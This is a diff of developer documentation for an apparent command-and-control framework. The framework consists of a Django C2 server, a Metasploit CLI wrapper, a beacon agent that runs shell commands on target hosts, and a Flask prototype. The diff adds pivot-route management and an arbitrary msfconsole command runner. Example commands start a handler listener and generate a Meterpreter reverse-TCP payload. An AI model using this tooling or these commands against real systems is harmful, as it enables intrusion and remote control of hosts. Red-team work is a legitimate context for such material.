@@ -13,7 +13,7 @@ The codebase is partially built and contains several wiring inconsistencies betw
 The repo is four loosely-coupled pieces, not one integrated app:
 
 1. **`ryotenkai_gui/`** — the real C2 server. A Django 4.2 project (`ryotenkai_gui`) with one app, `command_centre`. Serves the dashboard UI and the beacon REST API, persists `Beacon`/`Task`/`Session`/`Job` to SQLite (`db.sqlite3`). This is the primary system.
-2. **`ryotenkai.py`** — standalone Metasploit CLI wrapper over `pymetasploit3` (MsfRpcClient). Refactored into layers: a connection helper (`make_client`), pure data functions (`get_jobs`/`get_sessions`/`run_exploit`/`access_session`/`run_session_command`/`generate_payload`/`kill_job` — they *return* data, never print), a presentation layer (`render_table` + `format_*`), and an `msfconsole`-style interactive REPL (`RtkConsole`). Subcommands: `run_module`, `get_jobs`, `get_sessions`, `run_command`, `generate_payload`, `start_rpc`, `interactive`. The non-interactive subcommands still print structured JSON to stdout (Ansible-parsing contract); the REPL renders human tables by default (toggle with `set output json`). Reads defaults from `config.ini [default]`. Unit-tested under `tests/` (pytest, mock RPC client — no live msfrpcd needed). Independent of Django; the Django app reimplements its own (simpler) Metasploit calls in `command_centre/utils.py` rather than importing this.
+2. **`ryotenkai.py`** — standalone Metasploit CLI wrapper over `pymetasploit3` (MsfRpcClient). Refactored into layers: a connection helper (`make_client`), pure data functions (`get_jobs`/`get_sessions`/`run_exploit`/`access_session`/`run_session_command`/`generate_payload`/`kill_job`/`run_console_cmd`/`get_routes`/`add_route`/`remove_route`/`flush_routes` — they *return* data, never print), a presentation layer (`render_table` + `format_*`), and an `msfconsole`-style interactive REPL (`RtkConsole`). Subcommands: `run_module`, `get_jobs`, `get_sessions`, `run_command`, `generate_payload`, `run_console`, `start_rpc`, `interactive`. `run_console` runs an arbitrary msfconsole command (e.g. `ryo run_console route print`) via a transient console and emits its output as JSON. The REPL adds a `routes`/`route` command (print/add/remove/flush) for managing MSF pivot routes. The non-interactive subcommands still print structured JSON to stdout (Ansible-parsing contract); the REPL renders human tables by default (toggle with `set output json`). Reads defaults from `config.ini [default]`. Unit-tested under `tests/` (pytest, mock RPC client — no live msfrpcd needed). Independent of Django; the Django app reimplements its own (simpler) Metasploit calls in `command_centre/utils.py` rather than importing this.
 3. **`agent.py`** — the beacon, run on a target host. Loops: check in to the C2, sleep a random `[min,max]` interval, repeat. `handle_task()` runs shell commands and posts results back.
 4. **`ryotenkai_c2.py`** — a separate, minimal **Flask** C2 prototype (in-memory task dict, `/beacon` + `/beacon/result`). Legacy/alternate to the Django server; not part of the Django flow. `beacon.py` is a stub (single junk line).
 
@@ -49,10 +49,11 @@ ryo start_rpc                                          # launch msfrpcd
 ryo interactive                                        # msfconsole-style REPL (use/set/run, jobs, sessions -i, generate)
 ryo run_module multi/handler --option LHOST=10.0.0.1 --option LPORT=4444  # OPTION=VALUE or "OPTION VALUE"
 ryo get_jobs
+ryo run_console route print                            # run any msfconsole command, JSON output
 ryo generate_payload elf linux/x64/meterpreter/reverse_tcp 10.0.0.1 4444 out.elf
 ```
 
-`ryotenkai.py` is unit-tested (48 tests). From the repo root:
+`ryotenkai.py` is unit-tested (69 tests). From the repo root:
 
 ```sh
 pip install -e ".[test]"          # or: pip install -r requirements.txt  (pymetasploit3, prompt_toolkit, pytest)
